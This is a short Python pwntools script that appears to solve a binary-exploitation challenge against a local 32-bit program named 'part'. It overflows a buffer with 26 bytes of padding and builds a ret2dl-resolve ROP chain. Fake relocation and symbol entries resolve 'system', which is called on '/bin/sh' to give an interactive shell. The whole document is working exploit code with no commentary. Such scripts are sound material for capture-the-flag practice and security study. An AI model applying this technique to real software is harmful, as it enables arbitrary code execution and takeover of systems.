from pwn import *
memcpy=0x8048310
p3r=0x08048539
p2r=0x0804853a
pr=0x080482ed
ret=0x080482d6
dynmic=0x8049f14
rel_plt=0x80482b4
dynstr=0x804822c
dynsym=0x80481cc
bss=0x804a040
data_addr=0x804a140
plt0=0x80482f0
rop=flat(
plt0,0x1e8c,
0xdeadbeef,data_addr+36#address of bin/sh/
)
data=flat(
[0x804a040,0x7+(((data_addr+0xc-dynsym)/16)<<8)],0xdeadbeef,#rel
[data_addr+28-dynstr,0,0,0x12],#sym
"system\0\0",
"/bin/sh\0"
)
payload=("A"*26+rop).ljust(256,'\0')+data
p=process("./part")
if False:
	gdb.attach(p,'''
	b *0xf7fead8b
	c
	''')
p.sendline(payload)
p.interactive()
